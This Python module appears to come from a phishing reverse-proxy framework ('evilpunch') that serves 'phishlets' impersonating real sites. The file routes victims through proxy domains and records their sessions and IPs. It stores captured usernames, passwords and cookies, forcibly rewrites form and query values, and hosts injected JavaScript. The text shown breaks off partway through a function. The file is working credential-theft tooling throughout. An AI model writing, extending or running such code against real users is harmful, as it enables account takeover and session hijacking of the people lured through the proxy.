import os
import ssl
import asyncio
import threading
import tempfile
import subprocess
import time
import logging
import traceback
import hashlib
import mimetypes
import multiprocessing
import signal
from multiprocessing import Process, Pool, Manager, cpu_count
# errno is not needed; we detect EADDRINUSE via message patterns
from pathlib import Path
from typing import Optional, Dict, Any, Tuple, List
from urllib.parse import urlparse
from aiohttp import web, ClientSession, WSMsgType, TCPConnector
from .helpers import *
from .puppet import puppet_onrequest, puppet_onresponse, inject_puppet_cookies, get_puppet_cookies

# --- COLORS ---
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_RED = "\033[91m"
ANSI_BLUE = "\033[94m"
ANSI_CYAN = "\033[96m"
ANSI_RESET = "\033[0m"

# --- CONFIGURATION ---
# No default TARGET_HOST; routing must come from active phishlets
TARGET_HOST = os.getenv("TARGET_HOST", "")
PROXY_HOST = os.getenv("PROXY_HOST", "xx.in")
PROXY_PORT = int(os.getenv("PROXY_PORT", "443"))
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_CERT_FILE = os.path.join(BASE_DIR, "certs", "cert.pem")
DEFAULT_KEY_FILE = os.path.join(BASE_DIR, "certs", "key.pem")

# Resolve certificate paths relative to the package root unless overridden via env
CERT_FILE = os.getenv("CERT_FILE", DEFAULT_CERT_FILE)
KEY_FILE = os.getenv("KEY_FILE", DEFAULT_KEY_FILE)
FALLBACK_HTTP_PORT = int(os.getenv("PROXY_FALLBACK_PORT", "8080"))

# Debug configuration
DEBUG_MODE = os.getenv("PROXY_DEBUG", "true").lower() == "true"
DEBUG_LEVEL = os.getenv("PROXY_DEBUG_LEVEL", "INFO").upper()

# --- MULTIPROCESSING CONFIGURATION ---
# Number of worker processes for multiprocessing
# Can be controlled via environment variable PROXY_WORKER_PROCESSES
# Default: Use all available CPU cores, minimum 2, maximum 8
DEFAULT_WORKER_PROCESSES = min(max(cpu_count(), 2), 8)
WORKER_PROCESSES = int(os.getenv("PROXY_WORKER_PROCESSES", str(DEFAULT_WORKER_PROCESSES)))

# Multiprocessing mode: 'process' for true multiprocessing, 'thread' for threading
MULTIPROCESSING_MODE = os.getenv("PROXY_MULTIPROCESSING_MODE", "process").lower()

# Enable/disable multiprocessing (enabled by default for better performance)
MULTIPROCESSING_ENABLED = os.getenv("PROXY_MULTIPROCESSING_ENABLED", "true").lower() == "true"

# --- STATIC FILE CACHING ---
# Cache configuration can be controlled via environment variables:
# STATIC_CACHE_ENABLED: Enable/disable caching (default: true)
# STATIC_CACHE_MAX_SIZE_MB: Maximum cache size in MB (default: 100)
# STATIC_CACHE_MAX_AGE_HOURS: Maximum age of cached files in hours (default: 24)
CACHE_FOLDER = os.path.join(BASE_DIR, "cache_folder")
CACHE_ENABLED = os.getenv("STATIC_CACHE_ENABLED", "true").lower() == "true"
CACHE_MAX_SIZE_MB = int(os.getenv("STATIC_CACHE_MAX_SIZE_MB", "100"))  # 100MB default
CACHE_MAX_AGE_HOURS = int(os.getenv("STATIC_CACHE_MAX_AGE_HOURS", "24"))  # 24 hours default

# Ensure cache folder exists
os.makedirs(CACHE_FOLDER, exist_ok=True)

# Cache statistics
_cache_stats = {
    "hits": 0,
    "misses": 0,
    "writes": 0,
    "total_size_bytes": 0
}

def _get_cache_path(phishlet_name: str, url_path: str, target_host: str) -> Path:
    """
    Generate cache file path based on phishlet name, URL path, and target host.
    Creates a unique filename using hash of the full URL.
    """
    try:
        # Clean phishlet name for filesystem safety
        safe_phishlet_name = "".join(c for c in phishlet_name if c.isalnum() or c in ('-', '_')).rstrip()
        if not safe_phishlet_name:
            safe_phishlet_name = "unknown_phishlet"
        
        # Create phishlet-specific cache directory
        phishlet_cache_dir = Path(CACHE_FOLDER) / safe_phishlet_name
        phishlet_cache_dir.mkdir(parents=True, exist_ok=True)
        
        # Create hash of the full URL for unique filename
        full_url = f"{target_host}{url_path}"
        url_hash = hashlib.md5(full_url.encode('utf-8')).hexdigest()
        
        # Get file extension from URL path
        file_ext = ""
        if '.' in url_path:
            file_ext = url_path.split('.')[-1]
            if len(file_ext) > 10:  # Sanity check for extension length
                file_ext = ""
        
        # Create filename with hash and extension
        if file_ext:
            filename = f"{url_hash}.{file_ext}"
        else:
            filename = url_hash
        
        cache_file_path = phishlet_cache_dir / filename
        
        # Create metadata file path
        metadata_file_path = phishlet_cache_dir / f"{url_hash}.meta"
        
        return cache_file_path, metadata_file_path
        
    except Exception as e:
        debug_log(f"Error generating cache path: {e}", "ERROR")
        return None, None

def _is_cacheable_file(url_path: str, content_type: str) -> bool:
    """
    Check if a file should be cached based on URL path and content type.
    """
    try:
        # Check file extension
        static_extensions = [
            '.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', 
            '.woff', '.woff2', '.ttf', '.eot', '.webp', '.mp4', '.mp3', 
            '.pdf', '.zip', '.rar', '.tar', '.gz', '.xml', '.json'
        ]
        
        has_static_extension = any(url_path.lower().endswith(ext) for ext in static_extensions)
        
        # Check content type
        cacheable_content_types = [
            'text/css', 'application/javascript', 'image/', 'font/', 
            'audio/', 'video/', 'application/pdf', 'application/json',
            'text/xml', 'application/xml'
        ]
        
        has_cacheable_content = any(ct in content_type.lower() for ct in cacheable_content_types)
        
        # Cache if either condition is met
        return has_static_extension or has_cacheable_content
        
    except Exception as e:
        debug_log(f"Error checking cacheability: {e}", "ERROR")
        return False

def _get_cache_metadata(metadata_file_path: Path) -> Optional[Dict[str, Any]]:
    """
    Read cache metadata from file.
    """
    try:
        if metadata_file_path.exists():
            import json
            with open(metadata_file_path, 'r', encoding='utf-8') as f:
                metadata = json.load(f)
            return metadata
    except Exception as e:
        debug_log(f"Error reading cache metadata: {e}", "ERROR")
    return None

def _write_cache_metadata(metadata_file_path: Path, metadata: Dict[str, Any]):
    """
    Write cache metadata to file.
    """
    try:
        import json
        with open(metadata_file_path, 'w', encoding='utf-8') as f:
            json.dump(metadata, f, indent=2)
    except Exception as e:
        debug_log(f"Error writing cache metadata: {e}", "ERROR")

def _is_cache_valid(metadata: Dict[str, Any]) -> bool:
    """
    Check if cached file is still valid based on age and size.
    """
    try:
        import time
        current_time = time.time()
        cache_time = metadata.get('cache_time', 0)
        max_age_seconds = CACHE_MAX_AGE_HOURS * 3600
        
        # Check if cache is too old
        if current_time - cache_time > max_age_seconds:
            debug_log(f"Cache expired: {current_time - cache_time:.1f}s > {max_age_seconds}s", "DEBUG")
            return False
        
        # Check if file still exists and size matches
        cache_file_path = Path(metadata.get('cache_file_path', ''))
        if not cache_file_path.exists():
            debug_log("Cache file no longer exists", "DEBUG")
            return False
        
        current_size = cache_file_path.stat().st_size
        cached_size = metadata.get('file_size', 0)
        
        if current_size != cached_size:
            debug_log(f"Cache file size mismatch: {current_size} != {cached_size}", "DEBUG")
            return False
        
        return True
        
    except Exception as e:
        debug_log(f"Error checking cache validity: {e}", "ERROR")
        return False

def _write_to_cache(cache_file_path: Path, content: bytes, metadata_file_path: Path, 
                    url_path: str, target_host: str, content_type: str, phishlet_name: str):
    """
    Write file content to cache and update metadata.
    """
    try:
        # Write file content
        with open(cache_file_path, 'wb') as f:
            f.write(content)
        
        # Create metadata
        import time
        metadata = {
            'url_path': url_path,
            'target_host': target_host,
            'phishlet_name': phishlet_name,
            'content_type': content_type,
            'file_size': len(content),
            'cache_time': time.time(),
            'cache_file_path': str(cache_file_path),
            'last_accessed': time.time()
        }
        
        # Write metadata
        _write_cache_metadata(metadata_file_path, metadata)
        
        # Update cache statistics
        _cache_stats['writes'] += 1
        _cache_stats['total_size_bytes'] += len(content)
        
        debug_log(f"✅ Cached static file: {url_path} ({len(content)} bytes)", "INFO")
        debug_log(f"   Cache location: {cache_file_path}", "DEBUG")
        
    except Exception as e:
        debug_log(f"Error writing to cache: {e}", "ERROR")

def _read_from_cache(cache_file_path: Path, metadata_file_path: Path) -> Optional[Tuple[bytes, Dict[str, Any]]]:
    """
    Read file content from cache and update access time.
    """
    try:
        # Read file content
        with open(cache_file_path, 'rb') as f:
            content = f.read()
        
        # Read and update metadata
        metadata = _get_cache_metadata(metadata_file_path)
        if metadata:
            import time
            metadata['last_accessed'] = time.time()
            _write_cache_metadata(metadata_file_path, metadata)
            
            # Update cache statistics
            _cache_stats['hits'] += 1
            
            debug_log(f"✅ Cache HIT: {metadata.get('url_path', 'unknown')} ({len(content)} bytes)", "INFO")
            return content, metadata
        
    except Exception as e:
        debug_log(f"Error reading from cache: {e}", "ERROR")
    
    return None

def _cleanup_cache():
    """
    Clean up old cache files to maintain size limits.
    """
    try:
        import time
        current_time = time.time()
        max_age_seconds = CACHE_MAX_AGE_HOURS * 3600
        max_size_bytes = CACHE_MAX_SIZE_MB * 1024 * 1024
        
        debug_log("Starting cache cleanup...", "DEBUG")
        
        # Collect all cache files with metadata
        cache_files = []
        for phishlet_dir in Path(CACHE_FOLDER).iterdir():
            if phishlet_dir.is_dir():
                for meta_file in phishlet_dir.glob("*.meta"):
                    try:
                        metadata = _get_cache_metadata(meta_file)
                        if metadata:
                            cache_file_path = Path(metadata.get('cache_file_path', ''))
                            if cache_file_path.exists():
                                cache_files.append((cache_file_path, meta_file, metadata))
                    except Exception as e:
                        debug_log(f"Error processing metadata file {meta_file}: {e}", "DEBUG")
        
        # Sort by last accessed time (oldest first)
        cache_files.sort(key=lambda x: x[2].get('last_accessed', 0))
        
        # Remove old files first
        for cache_file, meta_file, metadata in cache_files:
            if current_time - metadata.get('cache_time', 0) > max_age_seconds:
                try:
                    cache_file.unlink()
                    meta_file.unlink()
                    debug_log(f"Removed expired cache file: {metadata.get('url_path', 'unknown')}", "DEBUG")
                except Exception as e:
                    debug_log(f"Error removing expired cache file: {e}", "DEBUG")
        
        # Check total size and remove oldest if needed
        total_size = sum(Path(metadata.get('cache_file_path', '')).stat().st_size 
                        for _, _, metadata in cache_files 
                        if Path(metadata.get('cache_file_path', '')).exists())
        
        if total_size > max_size_bytes:
            debug_log(f"Cache size {total_size / (1024*1024):.1f}MB exceeds limit {CACHE_MAX_SIZE_MB}MB", "INFO")
            
            # Remove oldest files until under limit
            for cache_file, meta_file, metadata in cache_files:
                if total_size <= max_size_bytes:
                    break
                    
                try:
                    file_size = cache_file.stat().st_size
                    cache_file.unlink()
                    meta_file.unlink()
                    total_size -= file_size
                    debug_log(f"Removed old cache file to free space: {metadata.get('url_path', 'unknown')}", "DEBUG")
                except Exception as e:
                    debug_log(f"Error removing old cache file: {e}", "DEBUG")
        
        debug_log(f"Cache cleanup complete. Total size: {total_size / (1024*1024):.1f}MB", "DEBUG")
        
    except Exception as e:
        debug_log(f"Error during cache cleanup: {e}", "ERROR")

def get_cache_config() -> Dict[str, Any]:
    """
    Get cache configuration.
    """
    return {
        'enabled': CACHE_ENABLED,
        'cache_folder': CACHE_FOLDER,
        'max_size_mb': CACHE_MAX_SIZE_MB,
        'max_age_hours': CACHE_MAX_AGE_HOURS,
        'environment_variables': {
            'STATIC_CACHE_ENABLED': os.getenv("STATIC_CACHE_ENABLED", "true"),
            'STATIC_CACHE_MAX_SIZE_MB': os.getenv("STATIC_CACHE_MAX_SIZE_MB", "100"),
            'STATIC_CACHE_MAX_AGE_HOURS': os.getenv("STATIC_CACHE_MAX_AGE_HOURS", "24")
        }
    }

def get_cache_stats() -> Dict[str, Any]:
    """
    Get cache statistics.
    """
    total_size_mb = _cache_stats['total_size_bytes'] / (1024 * 1024)
    hit_rate = (_cache_stats['hits'] / (_cache_stats['hits'] + _cache_stats['misses'])) * 100 if (_cache_stats['hits'] + _cache_stats['misses']) > 0 else 0
    
    # Get actual cache directory information
    cache_info = {}
    try:
        if Path(CACHE_FOLDER).exists():
            phishlet_dirs = [d for d in Path(CACHE_FOLDER).iterdir() if d.is_dir()]
            cache_info['phishlet_directories'] = len(phishlet_dirs)
            
            total_files = 0
            total_actual_size = 0
            
            for phishlet_dir in phishlet_dirs:
                phishlet_files = [f for f in phishlet_dir.iterdir() if f.is_file() and f.suffix != '.meta']
                total_files += len(phishlet_files)
                
                for cache_file in phishlet_files:
                    try:
                        total_actual_size += cache_file.stat().st_size
                    except:
                        pass
            
            cache_info['total_cached_files'] = total_files
            cache_info['actual_size_mb'] = round(total_actual_size / (1024 * 1024), 2)
        else:
            cache_info['phishlet_directories'] = 0
            cache_info['total_cached_files'] = 0
            cache_info['actual_size_mb'] = 0
    except Exception as e:
        debug_log(f"Error getting cache directory info: {e}", "DEBUG")
        cache_info['error'] = str(e)
    
    return {
        'hits': _cache_stats['hits'],
        'misses': _cache_stats['misses'],
        'writes': _cache_stats['writes'],
        'total_size_mb': round(total_size_mb, 2),
        'hit_rate_percent': round(hit_rate, 2),
        'enabled': CACHE_ENABLED,
        'max_size_mb': CACHE_MAX_SIZE_MB,
        'max_age_hours': CACHE_MAX_AGE_HOURS,
        'cache_folder': CACHE_FOLDER,
        'cache_info': cache_info,
        'configuration': get_cache_config()
    }

def get_cache_directory_info() -> Dict[str, Any]:
    """
    Get detailed information about cache directory structure.
    """
    try:
        cache_info = {
            'cache_folder': CACHE_FOLDER,
            'phishlets': {}
        }
        
        if Path(CACHE_FOLDER).exists():
            for phishlet_dir in Path(CACHE_FOLDER).iterdir():
                if phishlet_dir.is_dir():
                    phishlet_name = phishlet_dir.name
                    phishlet_info = {
                        'directory': str(phishlet_dir),
                        'cache_files': 0,
                        'metadata_files': 0,
                        'total_size_bytes': 0,
                        'files': []
                    }
                    
                    for cache_file in phishlet_dir.iterdir():
                        if cache_file.is_file():
                            try:
                                file_size = cache_file.stat().st_size
                                if cache_file.suffix == '.meta':
                                    phishlet_info['metadata_files'] += 1
                                    # Try to read metadata for more info
                                    try:
                                        metadata = _get_cache_metadata(cache_file)
                                        if metadata:
                                            phishlet_info['files'].append({
                                                'name': cache_file.name,
                                                'type': 'metadata',
                                                'size_bytes': file_size,
                                                'url_path': metadata.get('url_path', 'unknown'),
                                                'target_host': metadata.get('target_host', 'unknown'),
                                                'cache_time': metadata.get('cache_time', 0),
                                                'last_accessed': metadata.get('last_accessed', 0)
                                            })
                                    except:
                                        phishlet_info['files'].append({
                                            'name': cache_file.name,
                                            'type': 'metadata',
                                            'size_bytes': file_size
                                        })
                                else:
                                    phishlet_info['cache_files'] += 1
                                    phishlet_info['total_size_bytes'] += file_size
                                    phishlet_info['files'].append({
                                        'name': cache_file.name,
                                        'type': 'cache',
                                        'size_bytes': file_size
                                    })
                            except Exception as e:
                                debug_log(f"Error processing cache file {cache_file}: {e}", "DEBUG")
                    
                    phishlet_info['total_size_mb'] = round(phishlet_info['total_size_bytes'] / (1024 * 1024), 2)
                    cache_info['phishlets'][phishlet_name] = phishlet_info
        
        return cache_info
        
    except Exception as e:
        debug_log(f"Error getting cache directory info: {e}", "ERROR")
        return {'error': str(e)}

# --- JAVASCRIPT INJECTION ---
# Store temporary JavaScript endpoints: {endpoint_id: js_code}
_temp_js_endpoints: Dict[str, str] = {}
# ---------------------
# ---------------------

# Setup logging
logging.basicConfig(
    level=getattr(logging, DEBUG_LEVEL, logging.INFO),
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def debug_log(message: str, level: str = "INFO"):
    """Centralized debug logging with color coding"""
    if not DEBUG_MODE:
        return
    # if not level in ["WARN"]:
    #     return
    
    timestamp = time.strftime("%H:%M:%S")
    if level == "ERROR":
        print(f"{ANSI_RED}[{timestamp}] [ERROR] {message}{ANSI_RESET}")
    elif level == "WARN":
        print(f"{ANSI_YELLOW}[{timestamp}] [WARN] {message}{ANSI_RESET}")
    elif level == "DEBUG":
        print(f"{ANSI_CYAN}[{timestamp}] [DEBUG] {message}{ANSI_RESET}")
    elif level == "INFO":
        print(f"{ANSI_BLUE}[{timestamp}] [INFO] {message}{ANSI_RESET}")
    else:
        print(f"{ANSI_GREEN}[{timestamp}] [{level}] {message}{ANSI_RESET}")


async def remove_server_header(app, response):
    """Remove the Server header from aiohttp responses for security"""
    response.headers.pop('Server', None)


_server_thread: Optional[threading.Thread] = None
_loop: Optional[asyncio.AbstractEventLoop] = None
_runner: Optional[web.AppRunner] = None
_site: Optional[web.TCPSite] = None
_stop_event: Optional[threading.Event] = None
_status: Dict[str, Any] = {"running": False, "port": None, "error": None, "scheme": None}

# --- MULTIPROCESSING STATE ---
_worker_processes: List[Process] = []
_worker_pool: Optional[Pool] = None
_process_manager: Optional[Manager] = None
_shared_status: Optional[Dict[str, Any]] = None

# --- Dynamic multi-host routing state ---
# proxy hostname (served by us) -> target hostname (origin)
_routing_table: Dict[str, str] = {}
_reverse_routing_table: Dict[str, str] = {}

# Active proxy hostnames allowed (from DB or config)
_active_proxy_hosts: List[str] = []

# SNI: hostname -> SSLContext
_sni_contexts: Dict[str, ssl.SSLContext] = {}

# Directory where we materialize PEM files from DB to feed ssl.load_cert_chain
_runtime_cert_dir: Optional[Path] = None

# --- MULTIPROCESSING HELPERS ---
def _setup_multiprocessing():
    """Setup multiprocessing environment and signal handlers"""
    # Set multiprocessing start method (only in main process)
    if multiprocessing.current_process().name == 'MainProcess':
        if hasattr(multiprocessing, 'set_start_method'):
            try:
                multiprocessing.set_start_method('spawn', force=True)
                debug_log("Set multiprocessing start method to 'spawn'", "INFO")
            except RuntimeError:
                debug_log("Multiprocessing start method already set", "DEBUG")
        
        # Setup signal handlers for graceful shutdown (only in main process)
        try:
            def signal_handler(signum, frame):
                debug_log(f"Received signal {signum}, shutting down gracefully", "INFO")
                stop_proxy_server()
                os._exit(0)
            
            signal.signal(signal.SIGINT, signal_handler)
            signal.signal(signal.SIGTERM, signal_handler)
            debug_log("Signal handlers configured for graceful shutdown", "INFO")
        except ValueError as e:
            # Signal handlers can only be set in the main thread
            debug_log(f"Could not set signal handlers (not in main thread): {e}", "WARN")
            debug_log("Signal handling will be limited in this context", "INFO")
    else:
        debug_log("Not in main process, skipping signal handler setup", "DEBUG")

def _worker_target(worker_id: int, port: int, use_ssl: bool, stop_event):
    """Worker process target function (must be at module level for multiprocessing)"""
    try:
        debug_log(f"Worker process {worker_id} starting on port {port}", "INFO")
        
        # Create new event loop for this process
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Worker processes just wait for requests to be distributed to them
        # They don't bind to ports - the main process handles that
        debug_log(f"Worker {worker_id}: Ready to handle requests (SSL: {use_ssl})", "INFO")
        
        # Wait for stop signal
        while not stop_event.is_set():
            loop.run_until_complete(asyncio.sleep(0.1))
            
    except Exception as e:
        debug_log(f"Worker process {worker_id} error: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
    finally:
        try:
            loop.close()
        except Exception as e:
            debug_log(f"Error closing loop in worker {worker_id}: {e}", "WARN")
        debug_log(f"Worker process {worker_id} exiting", "INFO")

def _create_worker_process(worker_id: int, port: int, ssl_context, stop_event) -> Process:
    """Create a single worker process for the proxy server"""
    # Convert SSLContext to boolean flag to avoid pickling issues
    use_ssl = ssl_context is not None
    
    process = Process(
        target=_worker_target,
        args=(worker_id, port, use_ssl, stop_event),
        name=f'proxy-worker-{worker_id}',
        daemon=True
    )
    return process

async def _run_worker_server(worker_id: int, port: int, ssl_context, stop_event):
    """Run a single worker server instance"""
    debug_log(f"Worker {worker_id}: Starting server on port {port}", "INFO")
    
    app = web.Application()
    
    # Remove Server header for security
    app.on_response_prepare.append(remove_server_header)
    
    # Add routes for this worker
    app.router.add_route('GET', '/_cache/config', cache_config_handler)
    app.router.add_route('GET', '/_cache/stats', cache_stats_handler)
    app.router.add_route('GET', '/_cache/directory', cache_directory_handler)
    app.router.add_route('POST', '/_cache/clear', cache_clear_handler)
    app.router.add_route('POST', '/_cache/cleanup', cache_cleanup_handler)
    app.router.add_route('GET', '/_multiprocessing/stats', multiprocessing_stats_handler)
    app.router.add_route('GET', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
    app.router.add_route('OPTIONS', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
    app.router.add_route('*', '/{path:.*}', proxy_handler)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    try:
        site = web.TCPSite(runner, '0.0.0.0', port, ssl_context=ssl_context)
        await site.start()
        debug_log(f"Worker {worker_id}: Server started successfully on port {port}", "INFO")
        
        # Wait for stop signal
        while not stop_event.is_set():
            await asyncio.sleep(0.1)
            
    except Exception as e:
        debug_log(f"Worker {worker_id}: Error running server: {e}", "ERROR")
    finally:
        try:
            await runner.cleanup()
            debug_log(f"Worker {worker_id}: Server cleanup complete", "INFO")
        except Exception as e:
            debug_log(f"Worker {worker_id}: Error during cleanup: {e}", "ERROR")

# --- SESSION MANAGEMENT ---
def generate_session_id() -> str:
    """Generate a unique session identifier"""
    import secrets
    return secrets.token_urlsafe(32)

def get_client_ip(request) -> str:
    """Extract client IP address from request, handling proxies"""
    # Check for forwarded headers first (common with reverse proxies)
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        # Take the first IP in the chain
        return forwarded_for.split(',')[0].strip()
    
    # Check for real IP header
    real_ip = request.headers.get('X-Real-IP')
    if real_ip:
        return real_ip
    
    # Fallback to remote address
    if hasattr(request, 'remote') and request.remote:
        return request.remote
    elif hasattr(request, 'transport') and request.transport:
        return request.transport.get_extra_info('peername')[0]
    
    return 'unknown'

async def get_or_create_session(request, phishlet_id: int, proxy_domain: str):
    """
    Get existing session or create new one for this visitor on this phishlet+domain.
    Now includes proxy authentication logic.
    """
    try:
        def _session_operation():
            from .models import Session, Phishlet
            
            # Get the phishlet
            try:
                phishlet = Phishlet.objects.get(id=phishlet_id, is_active=True)
            except Phishlet.DoesNotExist:
                debug_log(f"Phishlet {phishlet_id} not found or inactive", "ERROR")
                return None
            
            # Check for existing session cookie
            session_cookie = request.cookies.get(f'evilpunch_session_{phishlet_id}')
            url_path = str(request.rel_url)
            
            if session_cookie:
                # Try to find existing session - check all sessions for this phishlet and session_cookie
                try:
                    # First try to find any active session for this phishlet and session_cookie
                    existing_sessions = Session.objects.filter(
                        session_cookie=session_cookie,
                        phishlet=phishlet,
                        is_active=True,
                        is_proxy_auth=True  # Only allow sessions created through proxy_auth
                    )
                    
                    # Check if any of these sessions match the current domain
                    for session in existing_sessions:
                        if session.domain_matches(proxy_domain):
                            debug_log(f"Found existing session: {session.get_short_session_id()} for phishlet {phishlet.name} matching domain {proxy_domain}", "DEBUG")
                            return session.session_cookie
                    
                    debug_log(f"Session cookie {session_cookie[:8]}... found but no matching domain for {proxy_domain}", "DEBUG")
                    # Continue to check proxy_auth path
                except Exception as e:
                    debug_log(f"Error checking existing sessions: {e}", "DEBUG")
                    # Continue to check proxy_auth path
            
            
            # Check if this is the proxy_auth path
            proxy_auth_path = phishlet.proxy_auth
            if not proxy_auth_path:
                debug_log("No proxy_auth path configured for this phishlet", "WARN")
                return None
            
            # Only create session if accessing the proxy_auth path
            if url_path != proxy_auth_path:
                debug_log(f"Access denied: {url_path} != {proxy_auth_path} (proxy_auth path)", "WARN")
                return None
            
            # Create new session only when accessing proxy_auth path
            new_session_cookie = generate_session_id()
            client_ip = get_client_ip(request)
            user_agent = request.headers.get('User-Agent', '')
            
            new_session = Session.create_session(
                session_cookie=new_session_cookie,
                phishlet=phishlet,
                proxy_domain=proxy_domain,  # Set to the actual proxy domain for cross-subdomain auth
                visitor_ip=client_ip,
                user_agent=user_agent,
                is_active=True,
                is_proxy_auth=True  # Mark this session as created through proxy_auth
            )
            
            debug_log(f"Created new session: {new_session.get_short_session_id()} for {client_ip} for phishlet {phishlet.name} via proxy_auth path", "INFO")
            return new_session_cookie
        
        # Run in thread executor to avoid Django async issues
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, _session_operation)
        
    except Exception as e:
        debug_log(f"Error in session management: {e}", "ERROR")
        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
        # Return a fallback session ID if something goes wrong
        return generate_session_id()

async def update_session_data(session_cookie: str, phishlet_id: int, proxy_domain: str, **kwargs):
    """
    Update session with captured data (username, password, cookies, etc.)
    """
    try:
        def _update_operation():
            from .models import Session, Phishlet
            
            try:
                session = Session.objects.get(
                    session_cookie=session_cookie,
                    phishlet_id=phishlet_id,
                    is_active=True
                )
                
                # Update the session with new data
                session.update_session_data(**kwargs)
                debug_log(f"Updated session {session.get_short_session_id()} with new data", "DEBUG")
                
            except Session.DoesNotExist:
                debug_log(f"Session {session_cookie[:8]}... not found for update", "WARN")
        
        # Run in thread executor to avoid Django async issues
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, _update_operation)
        
    except Exception as e:
        debug_log(f"Error updating session data: {e}", "ERROR")

def get_request_encoding(request):
    """
    Returns the encoding type of the request body based on Content-Type header.
    """
    content_type = request.headers.get('Content-Type', '').lower()
    if 'application/x-www-form-urlencoded' in content_type:
        return 'form'
    elif 'application/json' in content_type:
        return 'json'
    elif 'multipart/form-data' in content_type:
        return 'multipart'
    else:
        return 'unknown'
# 
async def force_post_data(request, phishlet_id: int):
    """
    In outgoing post request if keyword from phishlet force_post is there then do replacement.
    Handles both form and JSON encoded bodies.
    """
    try:
        if request.method == 'POST':
            request_path = str(request.rel_url)
            if phishlet_id:
                import asyncio
                import urllib.parse
                import json

                def _get_phishlet_data():
                    from .models import Phishlet
                    try:
                        phishlet = Phishlet.objects.get(id=phishlet_id)
                        return phishlet.data if isinstance(phishlet.data, dict) else {}
                    except Phishlet.DoesNotExist:
                        return {}

                loop = asyncio.get_running_loop()
                phishlet_data = await loop.run_in_executor(None, _get_phishlet_data)

                force_post_configs = phishlet_data.get('force_post', [])
                if not force_post_configs:
                    return

                request_body = await request.read()
                encoding = get_request_encoding(request)
                form_data = {}
                modified = False

                try:
                    if encoding == 'form':
                        form_str = request_body.decode('utf-8')
                        form_data = dict(urllib.parse.parse_qsl(form_str))
                    elif encoding == 'json':
                        form_data = json.loads(request_body.decode('utf-8'))
                    else:
                        debug_log(f"Unsupported encoding for force_post: {encoding}", "DEBUG")
                        return
                    # debug_log(f"Form data parsed for force_post: {form_data}", "DEBUG")
                except Exception as e:
                    debug_log(f"Could not parse request body for force_post: {e}", "DEBUG")
                    return

                for config in force_post_configs:
                    url = config.get('url', '')
                    method = config.get('method', 'POST').upper()
                    keyword = config.get('keyword', '')
                    use_regex = config.get('regexp', 'false').lower() == 'true'
                    regex_string = config.get('regexp_string', '')
                    replace_value = config.get('replace_value', '')

                    if url != request_path:
                        continue

                    if keyword in form_data:
                        original_value = form_data[keyword]
                        form_data[keyword] = replace_value
                        modified = True
                        debug_log(f"Force replaced keyword '{keyword}' value from '{original_value}' to '{replace_value}'", "INFO")

                    elif use_regex and regex_string:
                        try:
                            import re
                            if encoding == 'form':
                                form_str = urllib.parse.urlencode(form_data)
                                new_form_str, count = re.subn(regex_string, replace_value, form_str)
                                if count > 0:
                                    form_data = dict(urllib.parse.parse_qsl(new_form_str))
                                    modified = True
                                    debug_log(f"Force replaced using regex '{regex_string}' to '{replace_value}'", "INFO")
                            elif encoding == 'json':
                                json_str = json.dumps(form_data)
                                new_json_str, count = re.subn(regex_string, replace_value, json_str)
                                if count > 0:
                                    form_data = json.loads(new_json_str)
                                    modified = True
                                    debug_log(f"Force replaced using regex '{regex_string}' to '{replace_value}' in JSON", "INFO")
                        except Exception as e:
                            debug_log(f"Regex error in force_post: {e}", "ERROR")
                    else:
                        debug_log(f"Keyword '{keyword}' not found in form data for force_post", "DEBUG")

                # saving new form data
                if modified:
                    if encoding == 'form':
                        new_body = urllib.parse.urlencode(form_data).encode('utf-8')
                    elif encoding == 'json':
                        new_body = json.dumps(form_data).encode('utf-8')
                    else:
                        debug_log(f"Cannot force replace POST data: unsupported Content-Type '{request.headers.get('Content-Type', '')}'", "WARN")
                        return
                    request['_body'] = new_body
                    debug_log(f"Force post data modified for request to {request_path}", "INFO")

    except Exception as e:
        debug_log(f"Error in force_post_data: {e}", "ERROR")
# 
async def force_get_data(request, phishlet_id: int):
    """
    In outgoing GET request if keyword from phishlet force_get is there then do replacement.
    Modifies the query string and stores it on request['_modified_rel_url'] for forwarding.
    """
    try:
        if request.method == 'GET':
            request_path = request.rel_url.path
            if phishlet_id:
                import asyncio
                import urllib.parse

                def _get_phishlet_data():
                    from .models import Phishlet
                    try:
                        phishlet = Phishlet.objects.get(id=phishlet_id)
                        return phishlet.data if isinstance(phishlet.data, dict) else {}
                    except Phishlet.DoesNotExist:
                        return {}

                loop = asyncio.get_running_loop()
                phishlet_data = await loop.run_in_executor(None, _get_phishlet_data)

                force_get_configs = phishlet_data.get('force_get', [])
                if not force_get_configs:
                    return

                # Parse query parameters
                query_str = request.rel_url.query_string or ''
                query_params = dict(urllib.parse.parse_qsl(query_str, keep_blank_values=True))
                modified = False

                for config in force_get_configs:
                    url = config.get('url', '')
                    method = config.get('method', 'GET').upper()
                    keyword = config.get('keyword', '')
                    use_regex = str(config.get('regexp', 'false')).lower() == 'true'
                    regex_string = config.get('regexp_string', '')
                    replace_value = config.get('replace_value', '')

                    if method != 'GET' or url != request_path:
                        continue

                    if keyword and keyword in query_params:
                        original_value = query_params[keyword]
                        query_params[keyword] = replace_value
                        modified = True
                        debug_log(f"Force GET replaced '{keyword}' from '{original_value}' to '{replace_value}'", "INFO")
                    elif use_regex and regex_string:
                        try:
                            import re
                            new_query_str, count = re.subn(regex_string, replace_value, query_str)
                            if count > 0:
                                query_params = dict(urllib.parse.parse_qsl(new_query_str, keep_blank_values=True))
                                modified = True
                                debug_log(f"Force GET regex '{regex_string}' -> '{replace_value}'", "INFO")
                        except Exception as rex:
                            debug_log(f"Regex error in force_get: {rex}", "ERROR")
                    else:
                        debug_log(f"Keyword '{keyword}' not found for force_get", "DEBUG")

                if modified:
                    new_query_str = urllib.parse.urlencode(query_params, doseq=True)
